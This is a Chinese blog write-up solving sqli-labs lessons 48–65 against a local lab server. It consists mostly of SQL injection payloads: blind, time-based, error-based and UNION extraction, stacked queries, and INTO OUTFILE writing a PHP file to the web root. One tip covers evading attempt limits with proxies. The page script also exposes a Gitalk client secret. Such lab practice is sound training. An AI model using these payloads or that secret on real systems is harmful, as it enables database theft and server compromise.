<p>可以利用sort=rand(true/false)进行判断</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">172.18</span>.<span class="number">9.91</span>/sqli-labs-master/Less-<span class="number">48</span>/?<span class="keyword">sort</span>=rand(<span class="keyword">ascii</span>(<span class="keyword">left</span>(database(),<span class="number">1</span>))=<span class="number">178</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/95.png" alt></p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">172.18</span>.<span class="number">9.91</span>/sqli-labs-master/Less-<span class="number">48</span>/?<span class="keyword">sort</span>=rand(<span class="keyword">ascii</span>(<span class="keyword">left</span>(database(),<span class="number">1</span>))=<span class="number">115</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/96.png" alt></p>
<p>and后的延时注入</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">172.18</span>.<span class="number">9.91</span>/sqli-labs-master/Less-<span class="number">48</span>/?<span class="keyword">sort</span>=<span class="number">1</span>%20and%20(<span class="keyword">if</span>(ascii(<span class="keyword">substr</span>(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span>,<span class="number">0</span>,<span class="keyword">sleep</span>(<span class="number">5</span>)))</span><br></pre></td></tr></table></figure>

<p>同样可以使用into outfile进行</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://<span class="number">172.18</span><span class="number">.9</span><span class="number">.91</span>/sqli-labs-master/Less<span class="number">-47</span>/?<span class="built_in">sort</span>=<span class="number">1</span> <span class="keyword">into</span> outfile <span class="string">"路径"</span></span><br></pre></td></tr></table></figure>

<h4 id="less49"><a href="#less49" class="headerlink" title="less49"></a>less49</h4><p>本关卡与less47相似，区别在于没有错误回显，但是可以通过延时注入和导入文件注入的方式进行。</p>
<p>延时注入：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.18.9.91/sqli-labs-master/Less-49/?sort=1' and (if(ascii(substr((<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">69</span>,<span class="number">0</span>,<span class="keyword">sleep</span>(<span class="number">5</span>)))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>或者利用into outfile进行注入：</p>
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.18.9.91/sqli-labs-master/Less-49/?sort=1' into outfile "D:<span class="symbol">\\</span>phpStudy<span class="symbol">\\</span>WWW<span class="symbol">\\</span>sqli-labs-master<span class="symbol">\\</span>test.php" lines terminated by 0x3c3f70687020706870696e666f28293b3f3e2020--+</span><br></pre></td></tr></table></figure>

<h4 id="less50"><a href="#less50" class="headerlink" title="less50"></a>less50</h4><p>该关卡开始进行的是 order by stacked injection</p>
<p>执行sql语句使用的是mysqli-multi_query()函数，而之前使用的是mysqli_query()函数，两者的区别在于mysqli_multi_query()可以执行多个sql语句，而mysqli_query()只能执行一个sql语句，由此可以执行多个sql语句进行，也就是之前的stacked injection。</p>
<p>直接构造playload：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.18.9.91/sqli-labs-master/Less-50/<span class="keyword">index</span>.php?sort=<span class="number">1</span>;<span class="keyword">create</span> table less50 <span class="keyword">like</span> users</span><br></pre></td></tr></table></figure>

<p>也就是跟前面的stacked injection一样的，就不详细说了。</p>
<p><img src="/2019/12/27/sqli-labs-writeup/97.png" alt></p>
<h4 id="less51"><a href="#less51" class="headerlink" title="less51"></a>less51</h4><p>本关卡与less50最主要的区别在于sql查询语句中对传入参数的处理</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * <span class="keyword">FROM</span><span class="built_in"> users </span>ORDER BY <span class="string">'$id'</span></span><br></pre></td></tr></table></figure>

<p>在此关卡要进行stacked injection，要注释掉<code>&#39;</code>,playload如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.18.9.91/sqli-labs-master/Less-51/index.php?sort=1';<span class="keyword">create</span> <span class="keyword">table</span> less51 <span class="keyword">like</span> <span class="keyword">users</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/98.png" alt></p>
<h4 id="less52"><a href="#less52" class="headerlink" title="less52"></a>less52</h4><p>与less50是一样的，区别在于mysql错误不会再前台显示，但是对于堆叠注入没有影响。</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.18.9.91/sqli-labs-master/Less-52/<span class="keyword">index</span>.php?sort=<span class="number">1</span>;<span class="keyword">create</span> table less52 <span class="keyword">like</span> users</span><br></pre></td></tr></table></figure>

<p>就不截图了</p>
<h4 id="less53"><a href="#less53" class="headerlink" title="less53"></a>less53</h4><p>与less51是一样的，区别也在于mysql错误不回显，但是不影响堆叠注入。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.18.9.91/sqli-labs-master/Less-53/index.php?sort=1';<span class="keyword">create</span> <span class="keyword">table</span> less53 <span class="keyword">like</span> <span class="keyword">users</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<h2 id="第四部分-page-4-Challenges"><a href="#第四部分-page-4-Challenges" class="headerlink" title="第四部分/page-4 Challenges"></a>第四部分/page-4 Challenges</h2><h4 id="less54"><a href="#less54" class="headerlink" title="less54"></a>less54</h4><p>此系列主要是一个进阶的学习， 将前面学到的知识进行更深次的运用。 这一关我们主要考察<br>的依旧是字符型注入， 但是只能尝试十次。 所以需要在尝试的时候进行思考。 如何能更少的<br>减少次数。 这里的表名和密码等是每十次尝试后就强制进行更换。  </p>
<p>有键入数据的界面得知，数据库的名字为challenges，所以只需从获取表名开始。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.18.9.91/sqli-labs-master/Less-54/?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_security=<span class="string">'challenges'</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/99.png" alt></p>
<p>获知表名：ckcibj2h4j，找到该表的所有列</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.18.9.91/sqli-labs-master/Less-54/?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'ckcibj2h4j'</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>获取到所有列：id,sessid,secret_IZGY,tryy，尝试将所有的数据进行查看，此处知道密码在secret_IZGY列中，所以直接查看该列的内容。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.18.9.91/sqli-labs-master/Less-54/?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(secret_IZGY) <span class="keyword">from</span> challenges.ckcibj2h4j<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>获得密码：31RUuO2jP4KOXg2plHOs2U5s，提交</p>
<p><img src="/2019/12/27/sqli-labs-writeup/100.png" alt></p>
<p>其实实际渗透测试当中， 我们可以利用更换 ip（可以考虑代理） 或者更换浏览器等， 要看服<br>务器端检测什么内容进行限制  </p>
<h4 id="less55"><a href="#less55" class="headerlink" title="less55"></a>less55</h4><p>本关卡的sql语句为：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> security.users <span class="keyword">WHERE</span> <span class="keyword">id</span>=($<span class="keyword">id</span>) <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>这边与less54是一样的，只需将id进行一个处理，只需要<code>)</code>即可，但是这边要求次数为14次。</p>
<p>playload</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://172.18.9.91/sqli-labs-master/Less-55/?id=-1) union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'challenges'</span><span class="comment">--+</span></span><br><span class="line">获得表名：<span class="number">4</span>w6ojib0ir</span><br><span class="line"><span class="keyword">http</span>://<span class="number">172.18</span><span class="number">.9</span><span class="number">.91</span>/sqli-labs-<span class="keyword">master</span>/<span class="keyword">Less</span><span class="number">-55</span>/?<span class="keyword">id</span>=<span class="number">-1</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'4w6ojib0ir'</span><span class="comment">--+</span></span><br><span class="line">获得列名：<span class="keyword">id</span>,sessid,secret_Q2XN,tryy</span><br><span class="line"><span class="keyword">http</span>://<span class="number">172.18</span><span class="number">.9</span><span class="number">.91</span>/sqli-labs-<span class="keyword">master</span>/<span class="keyword">Less</span><span class="number">-55</span>/?<span class="keyword">id</span>=<span class="number">-1</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(secret_Q2XN) <span class="keyword">from</span> challenges<span class="number">.4</span>w6ojib0ir<span class="comment">--+</span></span><br><span class="line">获得密码：yOzUKUnWHxY5wz79sJpAB9W8</span><br></pre></td></tr></table></figure>

<h4 id="less56"><a href="#less56" class="headerlink" title="less56"></a>less56</h4><p>与less54 55形式一致，查看sql查询语句</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">security</span>.users <span class="keyword">WHERE</span> id=(<span class="string">'$id'</span>) <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>因此该关卡playload如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://172.18.9.91/sqli-labs-master/Less-56/?id=-1') union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'challenges'</span><span class="comment">--+</span></span><br><span class="line">获得表名:dblwc23jmy</span><br><span class="line"><span class="keyword">http</span>://<span class="number">172.18</span><span class="number">.9</span><span class="number">.91</span>/sqli-labs-<span class="keyword">master</span>/<span class="keyword">Less</span><span class="number">-56</span>/?<span class="keyword">id</span>=<span class="number">-1</span><span class="string">') union select 1,2,group_concat(column_name) from information_schema.columns where table_name='</span>dblwc23jmy<span class="string">'--+</span></span><br><span class="line"><span class="string">获得列名：id,sessid,secret_KJEU,tryy</span></span><br><span class="line"><span class="string">http://172.18.9.91/sqli-labs-master/Less-56/?id=-1'</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(secret_KJEU) <span class="keyword">from</span> challenges.dblwc23jmy<span class="comment">--+</span></span><br><span class="line">获得密码：qOHweRkLp9NGqcOXfRWXmhy5</span><br></pre></td></tr></table></figure>

<h4 id="less57"><a href="#less57" class="headerlink" title="less57"></a>less57</h4><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$id</span>= <span class="string">'"'</span>.<span class="symbol">$id</span>.<span class="string">'"'</span>;</span><br><span class="line"><span class="comment">// Querry DB to get the correct output</span></span><br><span class="line"><span class="symbol">$s</span>ql=<span class="string">"SELECT * FROM security.users WHERE id=$id LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>

<p>从代码中看到对id进行双引号处理，所以在构造的时候也需要进行双引号处理。</p>
<p>playload</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://172.18.9.91/sqli-labs-master/Less-57/?id=-1" union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'challenges'</span><span class="comment">--+</span></span><br><span class="line">获取表名：dblwc23jmy</span><br><span class="line">......</span><br><span class="line">参考上面</span><br></pre></td></tr></table></figure>

<h4 id="less58"><a href="#less58" class="headerlink" title="less58"></a>less58</h4><p>从源码看，执行sql语句之后没有返回数据库中查询到的数据，所以此处不能使用union联合注入，可采用报错注入：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://172.18.9.91/sqli-labs-master/Less-58/?id=-1' union <span class="keyword">select</span> extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'challenges'</span>),<span class="number">0x7e</span>))<span class="comment">--+</span></span><br><span class="line">获取表名：rjd4tc06ea</span><br><span class="line"><span class="keyword">http</span>://<span class="number">172.18</span><span class="number">.9</span><span class="number">.91</span>/sqli-labs-<span class="keyword">master</span>/<span class="keyword">Less</span><span class="number">-58</span>/?<span class="keyword">id</span>=<span class="number">-1</span><span class="string">' union select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='</span>rjd4tc06ea<span class="string">'),0x7e))--+</span></span><br><span class="line"><span class="string">获取列名：id,sessid,secret_ST23,tryy</span></span><br><span class="line"><span class="string">http://172.18.9.91/sqli-labs-master/Less-58/?id=-1'</span> <span class="keyword">union</span> <span class="keyword">select</span> extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(secret_ST23) <span class="keyword">from</span> challenges.rjd4tc06ea),<span class="number">0x7e</span>))<span class="comment">--+</span></span><br><span class="line">获取密码：tLpqQzTWb71CGf1cl8bzxSL1</span><br></pre></td></tr></table></figure>

<p>ps：这边只有五次机会，要注意</p>
<h4 id="less59"><a href="#less59" class="headerlink" title="less59"></a>less59</h4><p>查看源码，发现与less58一致，只是id的处理不一样，无需加单引号</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://172.18.9.91/sqli-labs-master/Less-59/?id=-1 union <span class="keyword">select</span> extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'challenges'</span>),<span class="number">0x7e</span>))<span class="comment">--+</span></span><br><span class="line">获得表名：<span class="number">9</span>xpilux6yo</span><br><span class="line"><span class="keyword">http</span>://<span class="number">172.18</span><span class="number">.9</span><span class="number">.91</span>/sqli-labs-<span class="keyword">master</span>/<span class="keyword">Less</span><span class="number">-59</span>/?<span class="keyword">id</span>=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'9xpilux6yo'</span>),<span class="number">0x7e</span>))<span class="comment">--+</span></span><br><span class="line">获得列名：<span class="keyword">id</span>,sessid,secret_VZL8,tryy</span><br><span class="line"><span class="keyword">http</span>://<span class="number">172.18</span><span class="number">.9</span><span class="number">.91</span>/sqli-labs-<span class="keyword">master</span>/<span class="keyword">Less</span><span class="number">-59</span>/?<span class="keyword">id</span>=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(secret_VZL8) <span class="keyword">from</span> challenges<span class="number">.9</span>xpilux6yo),<span class="number">0x7e</span>))<span class="comment">--+</span></span><br><span class="line">获得密码：OO6kBkvJ5VfAalX7e7HXkg6F</span><br></pre></td></tr></table></figure>

<h4 id="less60"><a href="#less60" class="headerlink" title="less60"></a>less60</h4><p>查看源码，发现与less59一致，只是id的处理不一样，增加双引号和括号</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://172.18.9.91/sqli-labs-master/Less-60/?id=-1") union <span class="keyword">select</span> extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'challenges'</span>),<span class="number">0x7e</span>))<span class="comment">--+</span></span><br><span class="line">获得表名：<span class="number">6</span>nq7xqxsry</span><br><span class="line">......</span><br><span class="line">参考上面</span><br></pre></td></tr></table></figure>

<h4 id="less61"><a href="#less61" class="headerlink" title="less61"></a>less61</h4><p>这次比较少见，是使用双括号处理id</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://172.18.9.91/sqli-labs-master/Less-61/?id=-1')) union <span class="keyword">select</span> extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'challenges'</span>),<span class="number">0x7e</span>))<span class="comment">--+</span></span><br><span class="line">获得表名：<span class="number">0</span>xoip0m86r</span><br></pre></td></tr></table></figure>

<h4 id="less62"><a href="#less62" class="headerlink" title="less62"></a>less62</h4><p>此处union和报错注入都是失效的，采用延时注入的方式：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.18.9.91/sqli-labs-master/Less-62/?id=1') and if(ascii(substr((<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'challenges'</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">79</span>,<span class="number">0</span>,<span class="keyword">sleep</span>(<span class="number">10</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>当正确的时候时间很短， 当错误的时候时间大于 10 秒，   每位去尝试，逐步才出相关信息</p>
<h4 id="less63"><a href="#less63" class="headerlink" title="less63"></a>less63</h4><p>与less62一致，但是只能使用延时注入的方式</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.18.9.91/sqli-labs-master/Less-63/?id=1' and if(ascii(substr((<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'challenges'</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">79</span>,<span class="number">0</span>,<span class="keyword">sleep</span>(<span class="number">10</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>当正确的时候时间很短， 当错误的时候时间大于 10 秒  </p>
<h4 id="less64"><a href="#less64" class="headerlink" title="less64"></a>less64</h4><p>sql语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> security.users <span class="keyword">WHERE</span> <span class="keyword">id</span>=(($<span class="keyword">id</span>)) <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>playload</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">172.18</span><span class="number">.9</span><span class="number">.91</span>/sqli-labs-master/Less<span class="number">-64</span>/?id=<span class="number">1</span>)) <span class="keyword">and</span> <span class="keyword">if</span>(ascii(substr((<span class="keyword">select</span> group_concat(<span class="built_in">table_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="string">'challenges'</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">79</span>,<span class="number">0</span>,sleep(<span class="number">10</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>当正确的时候时间很短， 当错误的时候时间大于 10 秒。  </p>
<h4 id="less65"><a href="#less65" class="headerlink" title="less65"></a>less65</h4><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$id</span> = <span class="string">'"'</span>.<span class="symbol">$id</span>.<span class="string">'"'</span>;</span><br><span class="line"><span class="comment">// Querry DB to get the correct output</span></span><br><span class="line"><span class="symbol">$s</span>ql=<span class="string">"SELECT * FROM security.users WHERE id=($id) LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>

<p>此处对 id 进行了 “” () 的处理， 构造 payload 时应该注意  </p>
<p>playload</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.18.9.91/sqli-labs-master/Less-65/?id=1") and if(ascii(substr((<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'challenges'</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">79</span>,<span class="number">0</span>,<span class="keyword">sleep</span>(<span class="number">10</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>!!!!!!!Ending</p>
</div><div class="post-copyright"><blockquote><p>原文作者: fzykn06</p><p>原文链接: <a href="http://fzykn06.github.io/2019/12/27/sqli-labs-writeup/">http://fzykn06.github.io/2019/12/27/sqli-labs-writeup/</a></p><p>版权声明: 转载请注明出处(必须保留作者署名及链接)</p></blockquote></div><div class="tags"></div><div class="post-share"><div class="social-share"><span>分享到:</span></div><div data-thread-key="2019/12/27/sqli-labs-writeup/" data-title="sqli-labs-writeup" data-url="http://fzykn06.github.io/2019/12/27/sqli-labs-writeup/" class="ds-share flat"><div class="ds-share-inline"><ul class="ds-share-icons-16"><li data-toggle="ds-share-icons-more"><a href="javascript:void(0);" class="ds-more">分享到:</a></li><li><a href="javascript:void(0);" data-service="weibo" class="ds-weibo">微博</a></li><li><a href="javascript:void(0);" data-service="qzone" class="ds-qzone">QQ空间</a></li><li><a href="javascript:void(0);" data-service="qqt" class="ds-qqt">腾讯微博</a></li><li><a href="javascript:void(0);" data-service="wechat" class="ds-wechat">微信</a></li></ul><div class="ds-share-icons-more"></div></div></div><div class="bdsharebuttonbox"><span style="float:left;line-height: 28px;height: 28px;font-size:16px;font-weight:blod">分享到:</span><a href="#" data-cmd="more" class="bds_more"></a><a href="#" data-cmd="mshare" title="分享到一键分享" class="bds_mshare"></a><a href="#" data-cmd="fbook" title="分享到Facebook" class="bds_fbook"></a><a href="#" data-cmd="twi" title="分享到Twitter" class="bds_twi"></a><a href="#" data-cmd="linkedin" title="分享到linkedin" class="bds_linkedin"></a><a href="#" data-cmd="youdao" title="分享到有道云笔记" class="bds_youdao"></a><a href="#" data-cmd="evernotecn" title="分享到印象笔记" class="bds_evernotecn"></a><a href="#" data-cmd="weixin" title="分享到微信" class="bds_weixin"></a><a href="#" data-cmd="qzone" title="分享到QQ空间" class="bds_qzone"></a><a href="#" data-cmd="tsina" title="分享到新浪微博" class="bds_tsina"></a></div><div class="jiathis_style"><span class="jiathis_txt">分享到:</span><a class="jiathis_button_tsina"></a><a class="jiathis_button_qzone"></a><a class="jiathis_button_weixin"></a><a class="jiathis_button_fb"></a><a class="jiathis_button_linkedin"></a><a class="jiathis_button_twitter"></a><a class="jiathis_button_ydnote"></a><a href="http://www.jiathis.com/share" target="_blank" rel="noopener" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis"></a><a class="jiathis_counter_style"></a></div></div><div class="post-nav"><a href="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/" class="pre">DVWA关卡纪录</a><a href="/2019/09/28/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E8%80%83%E6%A0%B8%E9%83%A8%E5%88%86writeup/" class="next">实验室考核部分writeup</a></div><div id="comments"><div id="container"><script type="text/javascript" src="https://unpkg.com/gitalk/dist/gitalk.min.js?v=2.0.4"></script><script type="text/javascript" src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js?v=2.0.4"></script><script>var gitalk = new Gitalk({
  clientID: '1817bee0e9bebbfec568',
  clientSecret: '0fed554209288ad9037d80cb0f5512d26423ad31',
  repo: 'fzykn06.github.io',
  owner: 'fzykn06',
  admin: ['fzykn06'],
  id: md5(window.location.pathname),
  distractionFreeMode: false,
  language: 'zh-CN',
  pagerDirection: 'last'
})
gitalk.render('container')</script></div></div></div></div></div><div class="layout-r"><div id="sidebar"><div class="search-pla"></div><div id="toc" class="widget"><div class="widget-title"><i class="fa fa-fei">文章目录</i></div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#基础知识"><span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sql注入分类"><span class="toc-text">sql注入分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#基于从服务器接收到的响应"><span class="toc-text">基于从服务器接收到的响应</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基于如何处理输入的SQL查询（数据类型）"><span class="toc-text">基于如何处理输入的SQL查询（数据类型）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基于程度和顺序的注入"><span class="toc-text">基于程度和顺序的注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常用知识点"><span class="toc-text">常用知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#常用函数："><span class="toc-text">常用函数：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#字符串连接函数"><span class="toc-text">字符串连接函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#一般的尝试性语句"><span class="toc-text">一般的尝试性语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#union查询"><span class="toc-text">union查询</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sql-union语法"><span class="toc-text">sql union语法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sql-union-all语法"><span class="toc-text">sql union all语法</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sqli-labs"><span class="toc-text">sqli-labs</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Basic"><span class="toc-text">Basic</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#基础注入"><span class="toc-text">基础注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#less1"><span class="toc-text">less1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less2"><span class="toc-text">less2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less3"><span class="toc-text">less3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less4"><span class="toc-text">less4</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#盲注"><span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#基于布尔sql盲注——通过构造逻辑判断"><span class="toc-text">基于布尔sql盲注——通过构造逻辑判断</span></a></li><li class="toc-item 